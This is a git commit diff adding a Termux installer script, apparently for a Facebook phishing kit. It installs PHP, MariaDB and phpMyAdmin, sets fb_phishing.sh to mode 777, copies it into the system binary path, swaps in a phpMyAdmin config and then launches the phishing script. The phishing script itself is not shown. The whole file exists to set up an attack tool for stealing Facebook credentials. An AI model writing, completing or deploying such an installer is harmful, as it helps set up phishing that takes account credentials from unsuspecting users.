9d4b0136acff7136586ec2a30eb5a7483df15ee2
venom24 <msfvenom24@gmail.com>
2025-05-17 21:58:37 -0600

    version2

---
+++ INSTALLER.sh
@@ -0,0 +1,28 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+
+#variables      
+                red='\033[1;31m'
+                green='\033[1;32m'
+                yellow='\033[1;33m'
+                blue='\033[1;34m'
+                magenta='\033[1;35m'
+                cyan='\033[1;36m'
+                reset='\033[0m'
+
+
+
+apt update
+apt upgrade -y
+apt install figlet php mariadb phpmyadmin -y
+
+ls
+chmod 777 fb_phishing.sh
+ls
+cp -r fb_phishing.sh /data/data/com.termux/files/usr/bin
+
+
+mv config.inc2.php $PREFIX/share/phpmyadmin/config.inc.php
+
+clear
+bash fb_phishing.sh
